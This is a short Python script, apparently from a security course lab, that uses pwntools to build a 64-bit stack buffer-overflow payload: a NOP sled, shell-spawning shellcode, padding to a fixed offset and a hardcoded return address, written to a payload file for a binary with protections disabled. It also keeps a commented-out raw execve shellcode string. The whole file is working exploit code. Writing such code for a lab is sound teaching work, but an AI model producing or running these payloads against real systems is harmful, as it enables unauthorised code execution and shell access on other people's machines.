# Generates `payload` to exploit all defenses lowered.

from pwn import *

context.arch = 'amd64'

# Commented out to see if the pwntools one can actually spawn the shell
# Cause running the shellcode, it immediately exits with no seg fault etc. (in gdb, it shows /usr/dash ran)
# shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

# Using pattc, patto to find the offset.
# https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/64-bit-stack-based-buffer-overflow
numOfPads = 1352

# 0x7fffffffdab0 in the middle of the NOPs.

payload = b"\x90" * (8*50) # NOP_SLED 1
payload += asm(shellcraft.sh())
payload += b"\x90" * (numOfPads - len(payload))
payload += p64(0x7fffffffdab0) # b"F" * 6 + b"\x00\x00"

# Checking the stack, it seems that the `EEEE` is being written suggesting that \x00 might not terminate the input.
payload += b"EEEE"

# Replace if needed
payloadPath = "~/CS5231/binary/payload"

with open (payloadPath, 'wb') as f:
    f.write(payload)
